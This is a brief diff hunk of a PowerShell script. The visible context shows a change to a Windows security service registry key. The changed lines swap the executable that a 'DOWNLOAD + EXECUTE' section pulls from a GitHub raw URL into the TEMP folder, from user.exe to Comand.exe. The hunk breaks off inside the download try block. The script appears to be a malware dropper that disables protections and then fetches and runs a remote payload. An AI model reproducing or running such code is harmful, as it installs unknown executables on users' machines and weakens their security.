@@ -138,8 +138,8 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthSe
 
 # ===== DOWNLOAD + EXECUTE user.exe =====
 $folder = $env:TEMP
-$url = "https://github.com/analysisw/test/raw/refs/heads/main/user.exe"
-$outFile = "$folder\user.exe"
+$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
+$outFile = "$folder\Comand.exe"
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
